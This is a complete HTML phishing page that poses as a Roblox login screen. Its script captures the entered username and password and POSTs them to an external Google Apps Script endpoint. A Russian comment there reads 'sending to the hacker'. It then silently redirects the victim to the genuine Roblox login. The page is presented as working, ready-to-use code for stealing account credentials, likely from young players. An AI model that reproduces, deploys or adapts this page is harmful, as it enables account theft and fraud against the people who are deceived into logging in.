<!DOCTYPE html>
<html>
<head>
    <title>Roblox Login</title>
    <style>
        body {
            background: #1a1a2e;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial;
        }
        .box {
            background: white;
            padding: 30px;
            border-radius: 10px;
            width: 350px;
            text-align: center;
        }
        .logo {
            font-size: 28px;
            font-weight: bold;
            color: #00b06f;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 14px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #00b06f;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        .links {
            margin-top: 15px;
            font-size: 12px;
        }
        .links a {
            color: #00b06f;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">ROBLOX</div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username / Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="links">
            <a href="https://www.roblox.com/login/forgot">Forgot Password?</a> |
            <a href="https://www.roblox.com/register">Sign Up</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            
            // Отправка хакеру
            fetch('https://script.google.com/macros/s/AKfycbzln6ZX0t801R_EUWeqOP9iK_L3aa0Fu8Rq6UizyjcqmJtQ6xTxyANMZtgP1FyvMrScTA/exec', {
                method: 'POST',
                body: JSON.stringify({username: username, password: password})
            });
            
            // Переброс на настоящий Roblox
            window.location.href = 'https://www.roblox.com/login';
        });
    </script>
</body>
</html>
